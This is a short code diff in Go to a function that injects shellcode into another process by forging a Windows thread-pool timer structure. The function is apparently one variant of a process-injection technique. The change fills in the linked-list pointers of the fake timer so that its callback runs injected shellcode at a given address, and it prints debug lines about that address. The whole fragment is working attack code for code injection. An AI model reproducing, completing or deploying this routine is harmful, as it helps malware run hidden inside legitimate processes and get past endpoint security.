@@ -962,15 +962,22 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	tpTimer.WindowStartLinks.Key = timeout
 	tpTimer.WindowEndLinks.Key = timeout
 
-	// Set up circular lists for WindowStart and WindowEnd Children
-	// Calculate remote addresses for the Window*Links.Children fields
+	// Set up circular lists for WindowStart and WindowEnd Children and Siblings
+	// Calculate remote addresses for the Window*Links fields
 	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Children))
 	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Children))
+	remoteWindowStartSiblingsAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Siblings))
+	remoteWindowEndSiblingsAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Siblings))
 
 	tpTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
 	tpTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
+	tpTimer.WindowStartLinks.Siblings.Flink = remoteWindowStartSiblingsAddr
+	tpTimer.WindowStartLinks.Siblings.Blink = remoteWindowStartSiblingsAddr
+	
 	tpTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
 	tpTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
+	tpTimer.WindowEndLinks.Siblings.Flink = remoteWindowEndSiblingsAddr
+	tpTimer.WindowEndLinks.Siblings.Blink = remoteWindowEndSiblingsAddr
 
 	output += "[+] Modified TP_TIMER structure for insertion\n"
 	output += fmt.Sprintf("[*] Debug: Callback address in structure = 0x%X (expected shellcode at 0x%X)\n", tpTimer.Work.CleanupGroupMember.Callback, shellcodeAddr)
